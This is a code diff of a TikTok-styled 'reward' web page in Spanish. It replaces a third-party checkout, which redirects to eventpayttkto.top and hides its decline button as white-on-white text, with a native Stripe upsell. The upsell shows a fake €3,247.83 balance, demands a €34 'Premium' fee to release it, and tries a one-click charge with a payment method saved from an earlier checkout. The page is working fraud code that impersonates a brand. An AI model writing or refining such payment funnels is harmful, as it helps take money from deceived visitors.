@@ -182,21 +182,207 @@ body{font-family:'TikTok Sans','Poppins',-apple-system,BlinkMacSystemFont,sans-s
         </div>
       </div>
 
-      <div style="margin-top:8px;">
-        <div style="display:flex;flex-direction:column;gap:12px;width:100%;align-items:center;font-family:inherit;" data-cooud-flow-root>
-          <script type="application/json">{"steps":[{"title":"2","priceText":"34,00 €","primary":{"id":"01KVQTVWF4YWVQPV2D5R7EE7WH","redirect":"https://eventpayttkto.top/2","label":"Comprar agora","style":"display: flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 600; padding: 12px 20px; font-size: 15px; border-radius: 10px; background-color: #FE2C55; color: #ffffff; border: none; width: 100%; cursor: pointer;"},"fallback":null,"dismiss":{"primary":{"label":"-","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 8px 16px; font-size: 14px; border-radius: 10px; background-color: #ffffff; color: #ffffff; border: none;  cursor: pointer;"},"fallback":{"label":"-","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 8px 16px; font-size: 14px; border-radius: 10px; background-color: #ffffff; color: #ffffff; border: none;  cursor: pointer;"}}}],"initialStep":0,"startInFallback":false,"routingMode":"legacy","processingText":"Processando...","noMoreOffersText":"Obrigado! Sem mais ofertas.","connectScriptUrl":"https://orbit.cooud.com/scripts/connect"}</script>
-          <button type="button" data-cooud-flow-primary data-connect-action="take" data-connect-id="01KVQTVWF4YWVQPV2D5R7EE7WH" data-connect-redirect="https://eventpayttkto.top/2" style="display:flex;align-items:center;justify-content:center;font-family:inherit;font-weight:600;padding:12px 20px;font-size:15px;border-radius:10px;background-color:#FE2C55;color:#fff;border:none;width:100%;cursor:pointer;">Comprar agora</button>
-          <button type="button" data-cooud-flow-dismiss data-connect-action="dismiss" style="display:inline-flex;align-items:center;justify-content:center;font-family:inherit;font-weight:400;padding:8px 16px;font-size:14px;border-radius:10px;background-color:#fff;color:#fff;border:none;cursor:pointer;">-</button>
-        </div>
-        <script src="https://js.stripe.com/v3/" async defer></script>
-        <script src="https://orbit.cooud.com/scripts/flow" async defer></script>
-      </div>
     </div>
 
     <div class="terms-footer">
       <p>Al participar en las actividades de recompensa, aceptas nuestros <a href="javascript:void(0)">Términos de Servicio</a> y <a href="javascript:void(0)">Política de Privacidad</a>.</p>
     </div>
   </div>
+
+  <!-- Popup de saldo upsell — Stripe nativa (34,00 €) -->
+  <div id="saldo-modal" class="modal">
+    <div class="modal-content">
+      <div class="reward-header">¡Su pago está en camino!</div>
+      <div class="reward-amount">€<span id="saldo-modal-amount">3.247,83</span></div>
+      <div class="reward-info" id="upsell-info">Activa tu cuenta Premium para liberar tu saldo ahora mismo.</div>
+
+      <!-- Estado: botón one-click (visible si hay paymentMethod guardado) -->
+      <div id="upsell-oneclick">
+        <button id="upsell-btn" type="button"
+          style="display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit;font-weight:600;padding:16px 24px;font-size:17px;border-radius:10px;background-color:#FE2C55;color:#fff;border:none;width:100%;cursor:pointer;margin-top:4px;">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 2L4 6v6c0 5 3.4 9.4 8 10.5C16.6 21.4 20 17 20 12V6L12 2Z" fill="currentColor"/></svg>
+          <span id="upsell-btn-label">Confirmar pago — 34,00 €</span>
+        </button>
+        <p style="font-size:11px;color:#9ca3af;margin-top:8px;text-align:center;">Pago con el mismo método del checkout anterior</p>
+      </div>
+
+      <!-- Estado: fallback PaymentElement (sem PM guardado) -->
+      <div id="upsell-element-wrap" style="display:none;margin-top:12px;">
+        <div id="upsell-payment-element"></div>
+        <button id="upsell-element-btn" type="button"
+          style="display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit;font-weight:600;padding:14px 20px;font-size:16px;border-radius:10px;background-color:#FE2C55;color:#fff;border:none;width:100%;cursor:pointer;margin-top:12px;">
+          <span>Pagar 34,00 €</span>
+        </button>
+      </div>
+
+      <!-- Estado: a processar -->
+      <div id="upsell-processing" style="display:none;text-align:center;padding:12px 0;">
+        <div style="width:36px;height:36px;border:4px solid #eee;border-top:4px solid #fe2c55;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px;"></div>
+        <p style="font-size:14px;color:#555;font-weight:500;">Procesando pago...</p>
+      </div>
+
+      <!-- Estado: erro -->
+      <div id="upsell-error" style="display:none;background:#fff0f3;border:1px solid #fecdd3;border-radius:8px;padding:10px 14px;margin-top:8px;font-size:13px;color:#be123c;"></div>
+
+      <button id="upsell-dismiss" type="button"
+        style="display:inline-flex;align-items:center;justify-content:center;font-family:inherit;font-weight:400;padding:8px 16px;font-size:13px;border-radius:8px;background:transparent;color:#9ca3af;border:none;cursor:pointer;margin-top:4px;width:100%;">
+        No gracias, continuar sin activar
+      </button>
+    </div>
+  </div>
+
+  <script src="https://js.stripe.com/v3/"></script>
+  <script>
+  (function () {
+    var STRIPE_PK = 'pk_live_51TZIE8LfsV7mxllBvCosSGGJHOol2Tyc8WJ5sTsvPWXYNX2GWlWrE1gYH8F2o2HwYvZ6RrafTvRlDstJ6V5Tknf10015hyOsqv';
+    var UPSELL_AMOUNT_CENTS = 3400;        // 34,00 €
+    var UPSELL_SUCCESS_URL  = '/entregavel';   // fluxo Stripe: s2 → thanks page
+    var UPSELL_SKIP_URL     = '/entregavel';   // fluxo Stripe: s2 → thanks page
+
+    var stripe = null;
+    var upsellElements = null;
+
+    function show(id)  { var el = document.getElementById(id); if (el) el.style.display = ''; }
+    function hide(id)  { var el = document.getElementById(id); if (el) el.style.display = 'none'; }
+    function showErr(msg) {
+      var el = document.getElementById('upsell-error');
+      if (!el) return;
+      el.textContent = msg;
+      el.style.display = 'block';
+    }
+    function hideErr() { hide('upsell-error'); }
+
+    function getStoredPM() {
+      try { return localStorage.getItem('stripe_pm_id') || null; } catch(_) { return null; }
+    }
+
+    function setProcessing(on) {
+      if (on) {
+        hide('upsell-oneclick'); hide('upsell-element-wrap');
+        show('upsell-processing'); hideErr();
+      } else {
+        hide('upsell-processing');
+      }
+    }
+
+    function onUpsellSuccess() {
+      try {
+        if (window.ttq && ttq.track) {
+          ttq.track('CompletePayment', { content_type: 'product', content_id: 'upsell-premium-2', value: 34, currency: 'EUR' });
+        }
+      } catch(_) {}
+      window.location.href = UPSELL_SUCCESS_URL;
+    }
+
+    // ── One-click: confirmar com PM guardado ──────────────────────────
+    function attemptOneClick(pmId) {
+      setProcessing(true);
+      fetch('/api/create-upsell-intent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ paymentMethodId: pmId, amountCents: UPSELL_AMOUNT_CENTS })
+      })
+      .then(function(r){ return r.json(); })
+      .then(function(data) {
+        if (data.error) { setProcessing(false); show('upsell-oneclick'); showErr(data.error); return; }
+        if (data.status === 'succeeded') {
+          onUpsellSuccess(); return;
+        }
+        if (data.clientSecret) {
+          stripe.confirmCardPayment(data.clientSecret).then(function(result) {
+            setProcessing(false);
+            if (result.error) { show('upsell-oneclick'); showErr(result.error.message); }
+            else if (result.paymentIntent && result.paymentIntent.status === 'succeeded') { onUpsellSuccess(); }
+          });
+        } else {
+          setProcessing(false); show('upsell-oneclick');
+          showErr('Error inesperado. Inténtalo de nuevo.');
+        }
+      })
+      .catch(function(err) {
+        setProcessing(false); show('upsell-oneclick');
+        showErr('Error de red. Por favor, inténtalo de nuevo.');
+      });
+    }
+
+    // ── Fallback: PaymentElement completo ─────────────────────────────
+    function loadFallbackElement() {
+      fetch('/api/create-upsell-intent', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amountCents: UPSELL_AMOUNT_CENTS })
+      })
+      .then(function(r){ return r.json(); })
+      .then(function(data) {
+        if (data.error) { showErr(data.error); return; }
+        upsellElements = stripe.elements({
+          clientSecret: data.clientSecret,
+          appearance: { theme: 'stripe', variables: { colorPrimary: '#fe2c55', borderRadius: '10px' } }
+        });
+        var pe = upsellElements.create('payment');
+        pe.mount('#upsell-payment-element');
+        show('upsell-element-wrap');
+      })
+      .catch(function() { showErr('Error al cargar el formulario. Recarga la página.'); });
+    }
+
+    function initUpsell() {
+      stripe = Stripe(STRIPE_PK);
+
+      // Abre o modal ao carregar a página
+      var sm = document.getElementById('saldo-modal');
+      if (sm) {
+        try {
+          var v = parseFloat(localStorage.getItem('cq_saldo'));
+          var amt = sm.querySelector('.reward-amount span');
+          if (amt && isFinite(v) && v > 0) {
+            amt.textContent = Number(v).toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+          }
+        } catch(_) {}
+        sm.classList.add('active');
+      }
+
+      var pmId = getStoredPM();
+
+      if (pmId) {
+        show('upsell-oneclick');
+        hide('upsell-element-wrap');
+        document.getElementById('upsell-btn').addEventListener('click', function() {
+          hideErr();
+          attemptOneClick(pmId);
+        });
+      } else {
+        hide('upsell-oneclick');
+        loadFallbackElement();
+        document.getElementById('upsell-element-btn').addEventListener('click', function() {
+          if (!upsellElements) return;
+          var btn = document.getElementById('upsell-element-btn');
+          btn.disabled = true; btn.firstElementChild.textContent = 'Procesando...';
+          setProcessing(true);
+          stripe.confirmPayment({
+            elements: upsellElements,
+            confirmParams: { return_url: window.location.origin + UPSELL_SUCCESS_URL }
+          }).then(function(result) {
+            setProcessing(false);
+            btn.disabled = false; btn.firstElementChild.textContent = 'Pagar 34,00 €';
+            if (result.error) { show('upsell-element-wrap'); showErr(result.error.message); }
+          });
+        });
+      }
+
+      document.getElementById('upsell-dismiss').addEventListener('click', function() {
+        if (sm) sm.classList.remove('active');
+        setTimeout(function() { window.location.href = UPSELL_SKIP_URL; }, 400);
+      });
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initUpsell);
+    } else {
+      initUpsell();
+    }
+  })();
+  </script>
 
   <div id="confetti-container"></div>
 
